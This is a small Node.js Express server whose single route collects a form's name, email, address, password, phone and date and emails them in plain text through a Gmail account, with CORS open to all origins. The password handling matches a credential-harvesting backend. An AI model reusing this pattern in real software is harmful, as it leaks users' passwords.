const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");

const app = express();
app.use(express.json());
app.use(cors());

app.post("/send", async (req, res) => {
    const { name, email, address, password, tel, date } = req.body;

    let transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: "fadfoud.code@gmail.com",
            pass: "" 
        }
    });

    let mailOptions = {
        from: email,
        to: "YOUR_EMAIL@gmail.com",
        subject: "New Form Submission",
        text: `
Name: ${name}
Email: ${email}
Address: ${address}
Password: ${password}
Tel: ${tel}
Date: ${date}
        `
    };

    try {
        await transporter.sendMail(mailOptions);
        res.send("Form submitted successfully!");
    } catch (error) {
        console.error(error);
        res.status(500).send("Error sending email");
    }
});

app.listen(3000, () => console.log("Server running on port 3000"));

